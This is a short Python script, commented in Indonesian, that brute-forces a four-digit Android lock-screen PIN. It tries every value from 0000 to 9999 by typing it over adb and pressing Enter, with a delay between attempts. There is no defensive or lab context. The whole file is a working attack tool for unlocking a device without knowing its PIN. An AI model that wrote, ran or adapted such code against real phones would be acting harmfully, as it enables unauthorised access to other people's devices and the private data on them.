import os
import time

def brute_force_pin(delay=5):
    print("🔥 Mulai brute force PIN 4 digit (tanpa cek status)...")
    for pin in range(10000):  # PIN dari 0000 sampai 9999
        guess = str(pin).zfill(4)  # Biar jadi format "0000", "0001", dst
        print(f"Nyoba PIN: {guess}")
        
        os.system(f'adb shell input text {guess}')
        os.system('adb shell input keyevent 66')  # Tekan Enter

        time.sleep(delay)  # Delay antar percobaan biar gak terlalu cepat

if __name__ == "__main__":
    brute_force_pin()
